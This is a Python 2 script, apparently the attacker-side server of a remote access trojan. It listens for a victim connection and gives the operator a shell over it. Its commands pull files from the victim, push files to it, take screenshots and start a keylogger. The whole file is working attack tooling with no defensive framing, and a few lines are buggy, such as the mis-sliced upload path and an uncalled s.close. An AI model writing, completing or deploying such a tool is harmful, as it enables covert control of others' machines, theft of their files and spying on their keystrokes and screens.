#!/usr/bin/python


import socket
import json
import base64

count = 1

def reliable_send(data):
	json_data = json.dumps(data)
	target.send(json_data)

def reliable_recv():
	json_data = ""
	while True:
		try:
			json_data = json_data + target.recv(1024)
			return json.loads(json_data)
		except ValueError:
			continue
def shell():
	global count
	while True:
		command = raw_input("Shell#%s:" %str(ip))
		reliable_send(command)
		if command == "q":
			break
		elif command[:2] == "cd" and len(command) > 1:
			continue
		elif command[:12] == "keylog_start":
			continue
		elif command[:8] == "download":
			with open(command[9:], "wb") as file:
				result = reliable_recv()
				file.write(base64.b64decode(result))
		elif command[:6] == "upload":
			try:
				with open(command[:7], "rb") as fin:
					reliable_send(base64.b64encode(fin.read()))
			except:
				failed = "failed to upload"
				reliable_send(base64.b64encode(failed))
		elif command[:10] == "screenshot":
			with open("screenshot%d" % count, "wb") as screen:
				image = reliable_recv()
				image_decoded = base64.b64decode(image)
				if image_decoded[:4] == "[!!]":
					print(image_decoded)
				else:
					screen.write(image_decoded)
					count += 1
		else:
			result = reliable_recv()
			print(result)
def server():
	global s
	global ip
	global target
	host = raw_input("enter the IP address:")
	port = int(raw_input("enter the port number:"))
	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
	s.bind((host,port))
	print("socket binded to %s" %(host))
	print("socket port binded to %s" %(port))
	s.listen(4)
	print("listening for incoming connections")
	target , ip = s.accept()
	print("connection established")
server()
shell()
s.close
